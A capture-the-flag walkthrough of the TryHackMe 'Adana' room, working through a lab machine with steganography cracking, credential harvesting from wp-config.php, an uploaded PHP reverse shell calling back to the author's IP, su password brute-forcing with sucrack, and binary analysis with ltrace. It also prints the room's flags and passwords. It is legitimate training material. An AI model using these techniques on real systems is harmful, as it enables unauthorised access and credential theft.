---
title: "Walk-through of Different CTF from TryHackMe"
header:
  teaser: /assets/images/2021-04-22-22-58-47.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - WordPress
  - steganography
  - sucrack
  - stegcracker
---

## Machine Information

![diffctf](/assets/images/2021-04-22-22-58-47.png)

Different CTF is a hard difficulty room on TryHackMe. An initial scan reveals a WordPress site, which we scan to find hidden files. These let us gain access to the server via FTP. After enumeration find a hidden subdomain, and use it to gain a reverse shell on to the server. From there we use sucrack to brute force our way to a user. And then we find an unusual binary that we analyse to find a picture. This leads us to the final root flag by using a hexeditor.

<!--more-->
Skills required are basic enumeration and file manipulation. Skills learned are using steganograpy tools, and brute forcing files and users.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Hard - Adana](https://tryhackme.com/room/adana) |
| Machine Release Date | 1st Feb 2021 |
| Date I Completed It | 17th April 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.100.87 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/thm/diffctf]
└─# nmap -p$ports -sC -sV -oA adana 10.10.100.87
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-17 16:58 BST
Nmap scan report for 10.10.100.87
Host is up (0.026s latency).

PORT   STATE SERVICE  VERSION
21/tcp open  ftp      vsftpd 3.0.3
80/tcp open  ssl/http Apache/2.4.29 (Ubuntu)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://10.10.100.87/
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.32 seconds
```

Just two ports open. First we add the server IP to our hosts file:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# echo "10.10.100.87 adana.thm" >> /etc/hosts
```

Now let's have a look at a possible website on port 80:

![diffctf-website](/assets/images/2021-04-22-21-11-33.png)

We find an default install of WordPress. There's a user hakanbey01, but nothing of any interest on the site. Let's look for subfolders:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://adana.thm
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://adana.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/04/17 22:28:42 Starting gobuster in directory enumeration mode
===============================================================
http://adana.thm/wp-content           (Status: 301) [Size: 319] [--> http://adana.thm/wp-content/]
http://adana.thm/announcements        (Status: 301) [Size: 322] [--> http://adana.thm/announcements/]
http://adana.thm/wp-includes          (Status: 301) [Size: 320] [--> http://adana.thm/wp-includes/]  
http://adana.thm/javascript           (Status: 301) [Size: 319] [--> http://adana.thm/javascript/]
http://adana.thm/wp-admin             (Status: 301) [Size: 317] [--> http://adana.thm/wp-admin/]
http://adana.thm/phpmyadmin           (Status: 301) [Size: 319] [--> http://adana.thm/phpmyadmin/]
http://adana.thm/server-status        (Status: 403) [Size: 278]
===============================================================
2021/04/17 22:41:04 Finished
===============================================================
```

What's in this announcements folder:

![diffctf-announce](/assets/images/2021-04-22-21-21-09.png)

A jpg and a wordlist. This has to be steganography with something hidden in the picture. Download both and have a go:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# wget http://adana.thm/announcements/austrailian-bulldog-ant.jpg     
--2021-04-22 21:22:50--  http://adana.thm/announcements/austrailian-bulldog-ant.jpg
Resolving adana.thm (adana.thm)... 10.10.235.235
Connecting to adana.thm (adana.thm)|10.10.235.235|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 59010 (58K) [image/jpeg]
Saving to: ‘austrailian-bulldog-ant.jpg’
austrailian-bulldog-ant.jpg         100%[===========================================>]  57.63K  --.-KB/s    in 0.1s    
2021-04-22 21:22:50 (441 KB/s) - ‘austrailian-bulldog-ant.jpg’ saved [59010/59010]

┌──(root💀kali)-[~/thm/diffctf]
└─# wget http://adana.thm/announcements/wordlist.txt               
--2021-04-22 21:23:01--  http://adana.thm/announcements/wordlist.txt
Resolving adana.thm (adana.thm)... 10.10.235.235
Connecting to adana.thm (adana.thm)|10.10.235.235|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 403891 (394K) [text/plain]
Saving to: ‘wordlist.txt’
wordlist.txt                        100%[===========================================>] 394.42K  --.-KB/s    in 0.1s    
2021-04-22 21:23:01 (2.72 MB/s) - ‘wordlist.txt’ saved [403891/403891]
```

Let's install stegcracker:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# apt install stegcracker
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libmcrypt4 libmhash2 steghide
Suggested packages:
  libmcrypt-dev mcrypt
The following NEW packages will be installed:
  libmcrypt4 libmhash2 stegcracker steghide
0 upgraded, 4 newly installed, 0 to remove and 95 not upgraded.
Need to get 323 kB of archives.
After this operation, 959 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://kali.download/kali kali-rolling/main amd64 libmcrypt4 amd64 2.5.8-3.4+b1 [73.3 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 libmhash2 amd64 0.9.9.9-9 [94.2 kB]
Get:3 http://kali.download/kali kali-rolling/main amd64 steghide amd64 0.5.1-15 [144 kB]
Get:4 http://kali.download/kali kali-rolling/main amd64 stegcracker all 2.1.0-1 [11.8 kB]
Fetched 323 kB in 1s (318 kB/s)   
Selecting previously unselected package libmcrypt4.
(Reading database ... 294373 files and directories currently installed.)
Preparing to unpack .../libmcrypt4_2.5.8-3.4+b1_amd64.deb ...
Unpacking libmcrypt4 (2.5.8-3.4+b1) ...
Selecting previously unselected package libmhash2:amd64.
Preparing to unpack .../libmhash2_0.9.9.9-9_amd64.deb ...
Unpacking libmhash2:amd64 (0.9.9.9-9) ...
Selecting previously unselected package steghide.
Preparing to unpack .../steghide_0.5.1-15_amd64.deb ...
Unpacking steghide (0.5.1-15) ...
Selecting previously unselected package stegcracker.
Preparing to unpack .../stegcracker_2.1.0-1_all.deb ...
Unpacking stegcracker (2.1.0-1) ...
Setting up libmhash2:amd64 (0.9.9.9-9) ...
Setting up libmcrypt4 (2.5.8-3.4+b1) ...
Setting up steghide (0.5.1-15) ...
Setting up stegcracker (2.1.0-1) ...
Processing triggers for libc-bin (2.31-9) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for kali-menu (2021.1.4) ...
```

Let's try the wordlist:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# stegcracker austrailian-bulldog-ant.jpg wordlist.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'austrailian-bulldog-ant.jpg' with wordlist 'wordlist.txt'..
Successfully cracked file with password: 123adanaantinwar
Tried 49316 passwords
Your file has been written to: austrailian-bulldog-ant.jpg.out
123adanaantinwar
```

We've found the password, what was hidden in there:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# file austrailian-bulldog-ant.jpg.out
austrailian-bulldog-ant.jpg.out: ASCII text

┌──(root💀kali)-[~/thm/diffctf]
└─# cat austrailian-bulldog-ant.jpg.out 
RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
```

Looks like base64:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# echo RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s= | base64 --decode
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack  
```

Nice one. We have username and password for the ftp server, let's try it:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# ftp adana.thm
Connected to adana.thm.
220 (vsFTPd 3.0.3)
Name (adana.thm:kali): hakanftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Ok, we are in. First have a look around:

```text
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jan 14 16:49 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08 22:13 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11 09:55 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08 22:13 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08 22:13 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09 10:53 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12 14:43 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
226 Directory send OK. 
```

It looks like we are in the root of the WordPress site. On a normal default install the wp-config.php file will contain the database credentials. Let's get it and have a look:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# cat wp-config.php   
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '12345' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

<SNIP>
```

We have user and password for the phpmyadmin login page, which we saw earlier when we ran gobuster. Let's try to log in:

![diffctf-phpadmin](/assets/images/2021-04-22-21-34-39.png)

The creds work and we get to the admin panel. Looking at the databases we can see there are two:

![diffctf-php-panel](/assets/images/2021-04-22-21-36-01.png)

The wp-options file contains the site URL, I see on the database we have a different one:

![diffctf-subdomain](/assets/images/2021-04-22-21-39-11.png)

Put this new subdomain in the hosts file:

```
──(root💀kali)-[~/thm/diffctf]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.235.235 adana.thm subdomain.adana.thm
```

So thinking about what we've found so far, there are two WordPress sites. One at adana.thm and one at subdomain.adana.thm. I can upload files via FTP, so let's see which site that ends up on. First a test file:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# echo "pencer was here" > test.txt
```

Upload the file, and change it's permission because by default you won't be able to read it from the webserver:

```text
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
16 bytes sent in 0.00 secs (868.0555 kB/s)

ftp> chmod 777 test.txt
200 SITE CHMOD command ok.
```

I tried adana.thm/test.txt but that didn't work so I tried subdomain.adana.thm and we get the file:

![diffctf-test](/assets/images/2021-04-22-21-44-30.png)

We have confirmed that a file uploaded via FTP can be accessed on the subdomain. Time to put a reverse shell on there, let's find one of the built in ones:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# locate php-reverse-shell
/root/htb/spectra/php-reverse-shell.php
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php
```

I like the pentestmonkey one:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# cp /usr/share/laudanum/php/php-reverse-shell.php shell.php
```

Just need to put our current tun0 IP in and a port:

```text
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.165.116';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
```

Upload it and change permissions:

```text
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5494 bytes sent in 0.00 secs (218.3119 MB/s)

ftp> chmod 777 shell.php
200 SITE CHMOD command ok.
```

Start a netcat listener to catch the shell:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# nc -nlvp 4444  
listening on [any] 4444 ...
```

Now call it using curl:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# curl http://subdomain.adana.thm/shell.php    
```

Switch back to netcat to see we are connected:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.235.235] 33138
Linux ubuntu 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 20:57:38 up 55 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Upgrade to a proper shell:

```text
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ ^Z  
zsh: suspended  nc -nlvp 4444
┌──(root💀kali)-[~/thm/diffctf]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
www-data@ubuntu:/$
```

That's better. Now let's see what users are on this box:

```text
$ ls -l /home
total 4
drwxr-x--- 15 hakanbey hakanbey 4096 Mar 15 12:45 hakanbey
```

Just one, but after a little looking around I got stuck on the next move. Then I looked back at the room banner:

![diffctf-banner](/assets/images/2021-04-22-22-04-06.png)

There's a clue on there. What is sucrack? Why is it mentioned?

I found it [here](https://github.com/hemp3l/sucrack), and it's a small tool to brute force su with a wordlist. We have a wordlist from before, and we know the user. Now we need to get both sucrack and the wordlist on to the server, we can use FTP again for this:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# git clone https://github.com/hemp3l/sucrack.git      

┌──(root💀kali)-[~/thm/diffctf]
└─# tar -czvf source-sucrack.tar.gz ./sucrack  

┌──(root💀kali)-[~/thm/diffctf]
└─# ftp adana.thm
Connected to adana.thm.
220 (vsFTPd 3.0.3)
Name (adana.thm:kali): hakanftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> put source-sucrack.tar.gz
local: source-sucrack.tar.gz remote: source-sucrack.tar.gz
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
321789 bytes sent in 0.09 secs (3.3806 MB/s)

ftp> put wordlist.txt
local: wordlist.txt remote: wordlist.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
403891 bytes sent in 0.12 secs (3.1115 MB/s)

ftp> chmod 777 source-sucrack.tar.gz 
200 SITE CHMOD command ok.

ftp> chmod 777 wordlist.txt
200 SITE CHMOD command ok.
```

Move the files to /tmp, then we have to compile sucrack:

```text
www-data@ubuntu:/$ mv /var/www/subdomain/source-sucrack.tar.gz /tmp
www-data@ubuntu:/$ mv /var/www/subdomain/wordlist.txt /tmp
www-data@ubuntu:/$ cd /tmp
www-data@ubuntu:/tmp$ tar xfz source-sucrack.tar.gz 
www-data@ubuntu:/tmp$ cd sucrack/

www-data@ubuntu:/tmp/sucrack$ ./configure 
checking for a BSD-compatible install... /usr/bin/install -c
checking whether build environment is sane... yes
checking for a thread-safe mkdir -p... /bin/mkdir -p
checking for gawk... gawk
checking whether make sets $(MAKE)... yes
checking whether make supports nested variables... yes
<SNIP>
configure: creating ./config.status
config.status: creating Makefile
config.status: creating src/Makefile
config.status: creating config.h
config.status: executing depfiles commands

sucrack configuration
---------------------
sucrack version         : 1.2.3
target system           : LINUX
sucrack link flags      : -pthread
sucrack compile flags   : -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\""

www-data@ubuntu:/tmp/sucrack$ make
make  all-recursive
make[1]: Entering directory '/tmp/sucrack'
Making all in src
make[2]: Entering directory '/tmp/sucrack/src'
gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-sucrack.o -MD -MP -MF .deps/sucrack-sucrack.Tpo -c -o sucrack-sucrack.o `test -f 'sucrack.c' || echo './'`sucrack.c
In file included from sucrack.c:41:0:
<SNIP>
mv -f .deps/sucrack-rules.Tpo .deps/sucrack-rules.Po
gcc -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -pthread  -o sucrack sucrack-sucrack.o sucrack-worker.o sucrack-dictionary.o sucrack-pty.o sucrack-su.o sucrack-rewriter.o sucrack-util.o sucrack-stat.o sucrack-rules.o  
make[2]: Leaving directory '/tmp/sucrack/src'
make[2]: Entering directory '/tmp/sucrack'
make[2]: Leaving directory '/tmp/sucrack'
make[1]: Leaving directory '/tmp/sucrack'
www-data@ubuntu:/tmp/sucrack$ 
```

Now we can try it:

```text
www-data@ubuntu:/tmp/sucrack/src$ sucrack -u hakanbey -w 100 wordlist.txt
```

However trying the wordlist didn't work. Then I looked back at the other passwords we found and noticed they both had the same prefix. So I tried adding that to all passwords in the wordlist:

```text
www-data@ubuntu:/tmp/sucrack/src$ awk '{print "123adana" $0}' wordlist.txt > new-wordlist.txt
```

Now I tried it again:

```text
www-data@ubuntu:/tmp/sucrack/src$ sucrack -u hakanbey -w 100 new-wordlist.txt
password is: 123adanasubaru
```

That worked and we have the user hakenbeys password. Let's su to them:

```text
www-data@ubuntu:/tmp$ su hakanbey
Password: 
hakanbey@ubuntu:/tmp$ 
```

First thing we get the flag:

```text
hakanbey@ubuntu:/tmp$ cd /home/hakanbey/
hakanbey@ubuntu:~$ cat user.txt 
THM{8ba9d7715fe726332b7fc9bd00e67127}
```

Check us out:

```text
hakanbey@ubuntu:/tmp$ id
uid=1000(hakanbey) gid=1000(hakanbey) groups=1000(hakanbey),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

Have a look for files owned by this user:

```text
hakanbey@ubuntu:/tmp$ find / -user hakanbey 2>/dev/null
/run/user/1000
/run/user/1000/bus
/run/user/1000/systemd
/run/user/1000/systemd/private
/run/user/1000/systemd/notify
/run/user/1000/gnupg
/run/user/1000/gnupg/S.gpg-agent
/run/user/1000/gnupg/S.gpg-agent.ssh
/run/user/1000/gnupg/S.dirmngr
/run/user/1000/gnupg/S.gpg-agent.extra
/run/user/1000/gnupg/S.gpg-agent.browser
/var/www/html/wwe3bbfla4g.txt
<SNIP>
/var/lib/lightdm-data/hakanbey
```

We found the other flag:

```text
hakanbey@ubuntu:/tmp$ cat /var/www/html/wwe3bbfla4g.txt
THM{343a7e2064a1d992c01ee201c346edff}
```

Nothing else obvious, let's have a look for files owned by our group:

```text
hakanbey@ubuntu:/tmp$ find /usr/bin -group hakanbey 2>/dev/null | more
/usr/bin/find
/usr/bin/binary
```

That binary file is interesting. Let's have a look at it:

```text
www-data@ubuntu:/$ file /usr/bin/binary
file /usr/bin/binary
/usr/bin/binary: setuid regular file, no read permission
www-data@ubuntu:/$ 
```

We can run it, let's try:

```text
hakanbey@ubuntu:/$ /usr/bin/binary
/usr/bin/binary
I think you should enter the correct string here ==>123adana
123adana
pkill: killing pid 2110 failed: Operation not permitted
pkill: killing pid 2113 failed: Operation not permitted
www-data@ubuntu:/$ 
```

I need to find the correct string. Ok let's try using strings:

```text
hakanbey@ubuntu:/tmp$ strings /usr/bin/binary
/lib64/ld-linux-x86-64.so.2
u6VO
libc.so.6
exit
<SNIP
[]A\A]A^A_
I think you should enter the correct string here ==>
/root/hint.txt
Hint! : %s
/root/root.jpg
Unable to open source!
/home/hakanbey/root.jpg
Copy /root/root.jpg ==> /home/hakanbey/root.jpg
Unable to copy!
;*3$"
```

We can see some ascii, let's use ltrace:

```text
hakanbey@ubuntu:/tmp$ ltrace /usr/bin/binary
strcat("war", "zone")                            = "warzone"
strcat("warzone", "in")                          = "warzonein"
strcat("warzonein", "ada")                       = "warzoneinada"
strcat("warzoneinada", "na")                     = "warzoneinadana"
printf("I think you should enter the cor"...)    = 52
__isoc99_scanf(0x56037e0adedd, 0x7ffc25e8ece0, 0, 0I think you should enter the correct string here ==>
^C <no return ...>
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
```

Aha, looks like something is revealed, we should try that:

```text
hakanbey@ubuntu:/tmp$ /usr/bin/binary
I think you should enter the correct string here ==>warzoneinadana
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
Copy /root/root.jpg ==> /home/hakanbey/root.jpg
```

We have another jpg, with instructions to look at it with a hexeditor, then something to do with CyberChef. First we get the file on to Kali:

```text
hakanbey@ubuntu:/tmp$ cp /home/hakanbey/root.jpg /var/www/subdomain/
```

Get the file:

```text
ftp> get root.jpg
local: root.jpg remote: root.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for root.jpg (45835 bytes).
226 Transfer complete.
45835 bytes received in 0.06 secs (811.5152 kB/s)
```

Use a hex editor to look at the file:

```text
┌──(root💀kali)-[~/thm/diffctf]
└─# xxd -l 50 root.jpg  
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
00000010: 0060 0000 ffe1 0078 4578 6966 0000 4d4d  .`.....xExif..MM
00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275  ...=y._..m..i..u
```

The hint mentions 00000020 and CyberChef. So I'm thinking I need to convert this HEX to something else, but what?

I scratched my head for a while, then looked back at the room description and noticed a hint for the last flag:

![diffctf-hint](/assets/images/2021-04-22-22-42-36.png)

Now it makes sense, so just need to paste our HEX in to CyberChef and convert to Base85:

![diffctf-root](/assets/images/2021-04-22-22-43-10.png)

That was a fun room. Hope you enjoyed it too. See you next time.
